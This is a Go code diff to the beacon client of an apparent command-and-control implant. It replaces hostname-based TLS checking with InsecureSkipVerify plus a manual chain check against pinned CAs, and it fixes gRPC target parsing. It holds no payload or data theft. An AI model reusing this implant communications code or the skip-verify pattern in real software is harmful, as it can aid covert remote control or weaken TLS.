@@ -81,14 +81,24 @@ func (b *Beacon) runOnce(ctx context.Context) error {
 	for _, ca := range b.cas {
 		pool.AddCert(ca)
 	}
+	// The dev teamserver presents the CA certificate itself as its server
+	// identity (TransportHost.ConfigureMtlsHttps), and that CA cert carries no
+	// Subject Alternative Names -- only CN="Rod Dev CA". Standard TLS name
+	// verification would therefore reject it for any dial address. The implant
+	// pins the CA explicitly (returned at enroll, or supplied via -ca-cert), so
+	// the security property here is chain-to-pinned-CA, not DNS name match --
+	// the same shape the C# beacon client uses (AllowUnknownCertificateAuthority
+	// + chain build against the dev CA). We disable Go's name check and replace
+	// it with a manual chain-to-pool verification in VerifyPeerCertificate.
 	creds := credentials.NewTLS(&tls.Config{
-		Certificates: []tls.Certificate{b.leaf},
-		RootCAs:      pool,
-		ServerName:   serverName(b.beaconURL),
-		MinVersion:   tls.VersionTLS12,
+		Certificates:          []tls.Certificate{b.leaf},
+		RootCAs:               pool,
+		InsecureSkipVerify:    true,
+		VerifyPeerCertificate: verifyChain(pool),
+		MinVersion:            tls.VersionTLS12,
 	})
 
-	conn, err := grpc.NewClient(b.beaconURL, grpc.WithTransportCredentials(creds))
+	conn, err := grpc.NewClient(grpcTarget(b.beaconURL), grpc.WithTransportCredentials(creds))
 	if err != nil {
 		return fmt.Errorf("dial: %w", err)
 	}
@@ -177,22 +187,48 @@ func (b *Beacon) sleepWithJitter(ctx context.Context) error {
 	}
 }
 
-// serverName extracts the host (without port) from the beacon URL for the TLS
-// ServerName. The dev teamserver presents the CA cert as its own identity, so
-// verification is chain-based (RootCAs) rather than name-based; we still set a
-// ServerName so the TLS handshake has a name to send in SNI.
-func serverName(beaconURL string) string {
+// grpcTarget converts a beacon URL (https://host:port or host:port) into the
+// host:port target grpc.NewClient expects. grpc.NewClient does not accept a
+// scheme in the target: it derives transport security from the credentials, so
+// a passed "https://127.0.0.1:5443" is misparsed as "host:port:443". Strip the
+// scheme and any trailing path, leaving just the authority.
+func grpcTarget(beaconURL string) string {
 	u := beaconURL
 	if i := indexOf(u, "://"); i >= 0 {
 		u = u[i+3:]
-	}
-	if i := indexOf(u, ":"); i >= 0 {
-		u = u[:i]
 	}
 	if i := indexOf(u, "/"); i >= 0 {
 		u = u[:i]
 	}
 	return u
+}
+
+// verifyChain returns a VerifyPeerCertificate callback that accepts the peer
+// certificate iff it chains to one of the pinned CAs in pool. Used with
+// InsecureSkipVerify=true (which disables Go's built-in name + chain check) so
+// the implant's security model -- pin the teamserver CA, ignore DNS names, which
+// the dev CA cert has none of -- is enforced here against the pinned pool.
+func verifyChain(pool *x509.CertPool) func([][]byte, [][]*x509.Certificate) error {
+	return func(rawCerts [][]byte, _ [][]*x509.Certificate) error {
+		if len(rawCerts) == 0 {
+			return errors.New("no server certificate presented")
+		}
+		certs := make([]*x509.Certificate, 0, len(rawCerts))
+		for _, raw := range rawCerts {
+			cert, err := x509.ParseCertificate(raw)
+			if err != nil {
+				return fmt.Errorf("parse server certificate: %w", err)
+			}
+			certs = append(certs, cert)
+		}
+		// Verify the leaf against the pinned pool. DNS/email/IP names are not
+		// checked (the dev CA has none); chain trust is the gate.
+		_, err := certs[0].Verify(x509.VerifyOptions{
+			Roots:     pool,
+			KeyUsages: []x509.ExtKeyUsage{x509.ExtKeyUsageServerAuth},
+		})
+		return err
+	}
 }
 
 func indexOf(s, sub string) int {
